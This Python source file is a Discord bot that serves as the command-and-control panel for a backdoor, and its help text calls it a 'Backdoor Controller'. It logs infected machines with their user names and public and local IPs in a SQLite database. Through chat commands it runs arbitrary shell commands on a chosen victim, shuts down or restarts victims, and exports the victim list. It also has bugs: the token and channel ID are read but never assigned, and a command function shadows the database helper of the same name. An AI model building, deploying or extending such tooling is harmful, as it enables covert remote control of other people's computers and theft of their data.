import discord
from discord.ext import commands
import json
import os
import asyncio
import sqlite3
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()
import os

os.getenv("BOT_TOKEN")
os.getenv("CONTROL_CHANNEL_ID")

# ============================================
# CONFIGURATION - REPLACE WITH YOUR VALUES
# ============================================


# ============================================
# SQLITE DATABASE SETUP
# ============================================
DB_FILE = "backdoors.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        name TEXT,
        user TEXT,
        public_ip TEXT,
        local_ip TEXT,
        last_seen TEXT
    )''')
    conn.commit()
    conn.close()

def get_all_devices():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT device_id, name, user, public_ip, local_ip, last_seen FROM devices")
    rows = c.fetchall()
    conn.close()
    return {row[0]: {"name": row[1], "user": row[2], "public_ip": row[3], "local_ip": row[4], "last_seen": row[5]} for row in rows}

def add_or_update_device(device_id, name, user, public_ip, local_ip, last_seen):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO devices (device_id, name, user, public_ip, local_ip, last_seen)
                 VALUES (?, ?, ?, ?, ?, ?)''', (device_id, name, user, public_ip, local_ip, last_seen))
    conn.commit()
    conn.close()

def remove_device(device_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

def clear_all_devices():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM devices")
    conn.commit()
    conn.close()

init_db()

# ============================================
# BOT SETUP
# ============================================
intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

def get_user_id(ctx):
    return str(ctx.author.id)

# Store active sessions (still in memory, but that's fine)
active_sessions = {}  # user_id -> {device_id, connected_at}

@bot.event
async def on_ready():
    print(f"Bot online! Logged in as {bot.user}")
    print(f"Bot is in {len(bot.guilds)} servers")
    print(f"Control channel: {CONTROL_CHANNEL_ID}")
    channel = bot.get_channel(CONTROL_CHANNEL_ID)
    if channel:
        await channel.send("Bot Controller Online! Type `!help` for commands.")

@bot.event
async def on_message(message):
    print(f"DEBUG: Received message from {message.author.name}: {message.content[:50]}")  # Debug
    
    # Special handling for REGISTER messages (even from bot itself)
    if message.content.startswith("REGISTER|"):
        print("DEBUG: Found REGISTER message!")  # Debug
        parts = message.content.split("|")
        print(f"DEBUG: Parts: {parts}")  # Debug
        if len(parts) >= 6:
            device_id = parts[1]
            pc_name = parts[2]
            user_name = parts[3]
            public_ip = parts[4]
            local_ip = parts[5]
            last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            add_or_update_device(device_id, pc_name, user_name, public_ip, local_ip, last_seen)
            await message.channel.send(f"✅ Registered: {device_id} - {pc_name}")
            print(f"[REGISTER] {device_id} | {pc_name} | {public_ip}")
        return
    
    # Ignore other messages from the bot itself
    if message.author == bot.user:
        print("DEBUG: Ignoring bot's own message")  # Debug
        return
    
    # Handle direct command execution for active sessions
    user_id = str(message.author.id)
    if user_id in active_sessions and not message.content.startswith('!'):
        session = active_sessions[user_id]
        device_id = session['device_id']
        content = message.content.strip()
        # Send the command in the format the backdoor expects
        await message.channel.send(f"!cmd {device_id} {content}")
        print(f"[SESSION] {device_id}: {content}")
        return
    
    await bot.process_commands(message)

# ============================================
# SESSION MANAGEMENT
# ============================================

@bot.command(name='connect', aliases=['use'])
async def connect_device(ctx, device_id: str):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    devices = get_all_devices()
    if device_id not in devices:
        await ctx.send(f"❌ Device `{device_id}` not found. Use `!devices` to see available devices.")
        return
    user_id = str(ctx.author.id)
    active_sessions[user_id] = {
        "device_id": device_id,
        "connected_at": datetime.now().strftime("%H:%M:%S")
    }
    info = devices[device_id]
    await ctx.send(f"✅ Connected to `{device_id}` ({info['name']})\nType any command to execute on this device.\nType `!disconnect` to end session.")

@bot.command(name='disconnect', aliases=['exit', 'end'])
async def disconnect_device(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    user_id = str(ctx.author.id)
    if user_id in active_sessions:
        device_id = active_sessions[user_id]['device_id']
        del active_sessions[user_id]
        await ctx.send(f"🔌 Disconnected from `{device_id}`")
    else:
        await ctx.send(f"❌ Not connected to any device. Use `!connect <id>` first.")

@bot.command(name='session', aliases=['current'])
async def show_session(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    user_id = str(ctx.author.id)
    if user_id in active_sessions:
        device_id = active_sessions[user_id]['device_id']
        devices = get_all_devices()
        if device_id in devices:
            info = devices[device_id]
            await ctx.send(f"🔗 Connected to: `{device_id}` - {info['name']} ({info['user']})")
        else:
            await ctx.send(f"⚠️ Session points to `{device_id}` but device not found.")
    else:
        await ctx.send(f"❌ No active session. Use `!connect <id>` first.")

# ============================================
# CORE COMMANDS
# ============================================

@bot.command(name='devices', aliases=['list'])
async def list_devices(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    devices = get_all_devices()
    if len(devices) == 0:
        await ctx.send("❌ No devices registered. Wait for backdoors to connect.")
        return
    user_id = str(ctx.author.id)
    current_session = active_sessions.get(user_id, {}).get('device_id')
    msg = f"**Registered Devices ({len(devices)}):**\n"
    for device_id, info in devices.items():
        status = "**[CONNECTED]** " if device_id == current_session else ""
        msg += f"{status}`{device_id}` - {info['name']} ({info['user']}) - {info['public_ip']}\n"
    await ctx.send(msg)

@bot.command(name='info')
async def device_info(ctx, device_id: str = None):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    if not device_id:
        user_id = str(ctx.author.id)
        if user_id in active_sessions:
            device_id = active_sessions[user_id]['device_id']
        else:
            await ctx.send("❌ No device specified. Use `!info <device_id>` or `!connect <device_id>` first.")
            return
    devices = get_all_devices()
    if device_id not in devices:
        await ctx.send(f"❌ Device `{device_id}` not found.")
        return
    info = devices[device_id]
    msg = f"**Device: {info['name']}**\n"
    msg += f"ID: `{device_id}`\n"
    msg += f"User: {info['user']}\n"
    msg += f"Public IP: {info['public_ip']}\n"
    msg += f"Local IP: {info['local_ip']}\n"
    msg += f"Last Seen: {info['last_seen']}"
    await ctx.send(msg)

@bot.command(name='run', aliases=['cmd'])
async def run_cmd(ctx, *, command: str):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    user_id = str(ctx.author.id)
    if user_id not in active_sessions:
        await ctx.send("❌ Not connected to any device. Use `!connect <id>` first.")
        return
    device_id = active_sessions[user_id]['device_id']
    devices = get_all_devices()
    if device_id not in devices:
        await ctx.send(f"❌ Device `{device_id}` not found. Use `!disconnect` and reconnect.")
        return
    # Send the command in the format the backdoor expects
    await ctx.send(f"!cmd {device_id} {command}")
    print(f"[CMD] {device_id}: {command}")

@bot.command(name='shutdown')
async def shutdown_device(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    user_id = str(ctx.author.id)
    if user_id not in active_sessions:
        await ctx.send("❌ Not connected to any device. Use `!connect <id>` first.")
        return
    device_id = active_sessions[user_id]['device_id']
    devices = get_all_devices()
    info = devices.get(device_id, {})
    await ctx.send(f"⚠️ Shutdown command sent to `{device_id}` ({info.get('name', 'Unknown')})")
    print(f"[SHUTDOWN] {device_id}")

@bot.command(name='restart')
async def restart_device(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    user_id = str(ctx.author.id)
    if user_id not in active_sessions:
        await ctx.send("❌ Not connected to any device. Use `!connect <id>` first.")
        return
    device_id = active_sessions[user_id]['device_id']
    devices = get_all_devices()
    info = devices.get(device_id, {})
    await ctx.send(f"🔄 Restart command sent to `{device_id}` ({info.get('name', 'Unknown')})")
    print(f"[RESTART] {device_id}")

@bot.command(name='remove')
async def remove_device(ctx, device_id: str):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    devices = get_all_devices()
    if device_id in devices:
        name = devices[device_id]['name']
        remove_device(device_id)
        # Also remove any sessions using this device
        for uid, session in list(active_sessions.items()):
            if session['device_id'] == device_id:
                del active_sessions[uid]
        await ctx.send(f"🗑️ Removed device: `{device_id}` ({name})")
    else:
        await ctx.send(f"❌ Device `{device_id}` not found.")

@bot.command(name='clear')
async def clear_devices(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    clear_all_devices()
    active_sessions.clear()
    await ctx.send("🗑️ All devices cleared from list and all sessions ended.")

@bot.command(name='online')
async def online_devices(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    devices = get_all_devices()
    if len(devices) == 0:
        await ctx.send("❌ No devices registered.")
        return
    msg = f"**Registered devices ({len(devices)}):**\n"
    for device_id, info in devices.items():
        msg += f"`{device_id}` - {info['name']} ({info['public_ip']})\n"
    await ctx.send(msg)

@bot.command(name='export')
async def export_devices(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    devices = get_all_devices()
    if len(devices) == 0:
        await ctx.send("❌ No devices to export.")
        return
    export_data = {
        "devices": devices,
        "sessions": active_sessions,
        "exported_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open("devices_export.json", "w") as f:
        json.dump(export_data, f, indent=2)
    await ctx.send(file=discord.File("devices_export.json"))
    os.remove("devices_export.json")

# ============================================
# HELP COMMAND
# ============================================

@bot.command(name='help', aliases=['commands', 'bothelp'])
async def show_help(ctx):
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
    msg = """
**Backdoor Controller Commands**

**SESSION MANAGEMENT**
`!devices` or `!list` - List all registered devices
`!connect <id>` or `!use <id>` - Connect to a device
`!disconnect` or `!exit` - Disconnect from current device
`!session` or `!current` - Show current active session
`!info <id>` - Show device details (omit id for current session)

**COMMANDS (on connected device)**
`!run <command>` or `!cmd` - Run any command on connected device
`!shutdown` - Shutdown connected device
`!restart` - Restart connected device

**MANAGEMENT**
`!online` - Show all registered devices
`!remove <id>` - Remove a device from list
`!clear` - Remove ALL devices
`!export` - Export device list as JSON
`!help` - Show this help menu

**Tip:** Connect to a device first, then just type commands directly!
"""
    await ctx.send(msg)

# ============================================
# RUN THE BOT
# ============================================

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
